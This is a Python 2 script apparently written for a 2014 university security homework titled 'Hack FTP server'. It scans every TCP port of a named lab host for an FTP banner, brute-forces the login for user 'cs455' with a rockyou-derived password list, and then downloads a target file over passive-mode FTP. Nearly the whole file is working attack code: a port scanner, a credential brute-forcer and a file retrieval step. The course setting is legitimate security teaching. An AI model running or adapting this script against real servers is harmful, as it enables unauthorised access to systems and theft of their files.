#!/usr/local/bin/python
#David Parrott
#CS 455 Fall 2014
#Homework 1 - Hack FTP server
#include python socket library
#these should be the only libararies you need 
from socket import *

#set variables serverName and USERNAME
#They are declared here to make it simple to change
#these frequently used variables later
serverName = 'netlab.encs.vancouver.wsu.edu'
USERNAME = b'cs455'

#tryConnect() attempts to connect to the server specified by serverName
#if successful a socket is returned. If not None is returned
def tryConnect(port):
    try:
        clientSocket = socket(AF_INET, SOCK_STREAM)
        clientSocket.connect((serverName, port))
        return clientSocket
    except:
        return None

#getResponse90 sends a message to the FTP server to prompt a response
#on the socket passed into it. If a response is received that is returned
#if an error occurs then None is returned
def getResponse(sock):
    try:
        sock.send("paging dr FTP\r\n")
        response = sock.recv(1024)
        return response
    except:
        return None

#This loop scans a range of ports defined in the range() by using tryConnect()
#to attempt to establish a socket and then getResponse to retrieve an initial
#response from the server
print "Scanning ports"
for port in range(1,65535):
    sock = tryConnect(port)
    if sock:
        response = getResponse(sock)
        if response:
            if "FTP" in response: break
        else:
            print "no response on port: " + str(port)
        sock.close()

#This statement assumes that an FTP server will be found during the port scanning
#process. For the purposes of this assignment this is a safe assumption
print "Found FTP server on port: " + str(port)

#Open the text file containing the passwords to be used in the brute force hack
#attempt. They are first stored in a list
with open('rockyou_light.txt', 'r') as f:
    content = f.readlines()

#tryLogin() attempts to login to a server with the USERNAME declared in the header
#and whatever password is sent as testPass using the socket passed as sock. A response
#is read and if the correct code is contained within the string testPass is returned
#otherwise None is returned
def tryLogin(sock, testPass):
    request = b'USER ' + USERNAME + b'\r\n'
    sock.send(request)
    response = sock.recv(1024)
#    print(response)
    request = b'PASS ' + str(testPass) +b'\r\n'
    sock.send(request)
    response = sock.recv(1024)
#    print(response)
    if "230" in response:
        print response
        return testPass
    else:
        return None

#Setup and loop that iterates over the passwords stored in content[] sending
#them to tryLogin. As long as password == None and there are more entries in
#content the loop will continue. Assumption is that one of the passwords in
#content[] is the correct one
print "Attempting to login. This may take several minutes"
contentCounter = len(content) - 1
sock = tryConnect(port)
password = tryLogin(sock, content[contentCounter])
contentCounter -= 1
while not password and contentCounter < len(content):
    sock = tryConnect(port)
    password = tryLogin(sock, content[contentCounter])
    contentCounter -= 1
print "Password found: " + str(password)

#setPASV() sends the PASV command on the socket passed in as sock. A response
#is read and the port number that the server is now listening on is calculated.
#Assumption is that the response is formatted correctly and contains the
#correct information for calculating the new port which is returned as retValue
def setPASV(sock):
    request = b'PASV'+b'\r\n'
    sock.send(request)
    response = sock.recv(1024)
    print response
    addr = response.strip("227 Entering Passive Mode (")
    addr = addr[:-4]
    addr = addr.split(",")
#    print addr
    retValue = int(addr[-2]) * 256 + int(addr[-1])
    return retValue

#Send PASV command to server on sock
print "Sending PASV"
passivePort = setPASV(sock)
passiveSock = tryConnect(passivePort)

#Method for getting the file list. Both the listening socket and the data socket
#are passed in. LIST command is sent to sock1, which is assumed to be the listening
#socket. A response is read and displayed from both the listening and data sockets.
#The response from the data socket is parsed to get the filename we are looking
#for, which contains 'cs455' and 'programming' which is then returned
def getList(sock1, sock2):
    request = b'LIST '+b'\r\n'
    sock1.send(request)
    msg = sock1.recv(1024)
    print msg
    response = sock2.recv(1024)
    print response
    response = response.split()
    for x in response:
        if "cs455" in x and "programming" in x:
            return x

#Get the filename form the server
fileName = getList(sock, passiveSock)
response = sock.recv(1024)

#Get the directory sent confirmation
print response

#Display information about what the client is doing
print "Attempting to download file: " + str(fileName)

#Send PASV again to open up a new socket for data
passivePort = setPASV(sock)
passiveSock = tryConnect(passivePort)

#Send the RETR command with the filename and read the response
request = b'RETR '+ fileName + b'\r\n'
sock.send(request)
response = sock.recv(1024)
print response

#Method for getting a file specified by fileName from a socket specified by sock
def getFile(fileName, sock):
    response = sock.recv(1024)
#    print response
    file = open(fileName, 'w')
    file.write(response)
    print "File transfer successful"

#Get the file and display the response from the server
getFile(fileName,passiveSock)
response = sock.recv(1024)
print response

#Send the QUIT command and close the socket as a last bit of hosuekeeping
def quit(sock):
    request = b'QUIT '+b'\r\n'
    sock.send(request)
    response = sock.recv(1024)
    print response
    sock.close()

#Quit and close sock
quit(sock)
